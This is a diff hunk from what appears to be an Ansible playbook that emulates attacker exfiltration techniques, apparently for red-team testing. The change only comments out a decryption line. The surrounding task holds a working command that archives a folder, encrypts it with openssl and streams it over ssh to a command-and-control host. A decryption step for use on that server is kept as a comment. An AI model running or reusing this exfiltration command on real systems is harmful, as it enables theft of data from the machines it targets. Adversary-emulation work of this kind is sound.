@@ -17,7 +17,7 @@
       tags: SSH
       shell: |
         tar czpf - {{ exfiltration_folder }}/* | openssl aes-256-cbc -salt -k {{ password_encryption }} | ssh {{ cnc_fqdn }} 'cat > {{ exfiltration_file }}-ssh.tar.gz.enc'
-        decrypt file on cnc: openssl aes-256-cbc -d -salt -k {{ password_encryption }} -in {{ exfiltration_file }}.tar.gz.enc -out {{ exfiltration_file }}.tar.gz    
+      # decrypt file on cnc: openssl aes-256-cbc -d -salt -k {{ password_encryption }} -in {{ exfiltration_file }}.tar.gz.enc -out {{ exfiltration_file }}.tar.gz    
     - name: Exfiltration Over Alternative Protocol - SSL/443
       tags: SSL
       shell: |
